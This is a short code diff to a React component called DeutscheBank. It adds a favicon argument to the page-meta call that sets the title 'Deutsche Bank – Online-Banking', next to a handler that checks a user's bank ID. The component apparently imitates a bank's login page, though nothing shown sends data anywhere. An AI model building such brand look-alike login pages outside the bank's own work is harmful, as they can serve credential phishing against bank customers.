@@ -23,7 +23,7 @@ const DeutscheBank = () => {
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
-  usePageMeta("Deutsche Bank – Online-Banking");
+  usePageMeta("Deutsche Bank – Online-Banking", "/favicon.ico");
 
   const handleContinue = () => {
     if (dbId.trim().length === 0) return;
